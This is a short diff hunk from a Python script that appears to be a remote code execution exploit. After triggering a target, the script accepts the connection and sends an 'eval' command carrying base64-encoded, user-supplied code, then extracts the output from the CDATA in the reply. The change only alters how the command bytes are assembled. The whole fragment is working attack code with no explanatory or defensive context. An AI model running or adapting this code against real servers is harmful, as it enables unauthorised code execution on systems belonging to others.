@@ -57,7 +57,7 @@ if __name__ == '__main__':
 
     pool.submit(trigger, args.target)
     conn, addr = sk.accept()
-    conn.sendall(b'eval -i 1 -- %s\x00' % base64.b64encode(args.code.encode()))
+    conn.sendall(b''.join([b'eval -i 1 -- ', base64.b64encode(args.code.encode()), b'\x00']))
 
     data = recvall(conn)
     g = re.search(rb'<\!\[CDATA\[([a-z0-9\./\+]+)\]>', data, re.I)
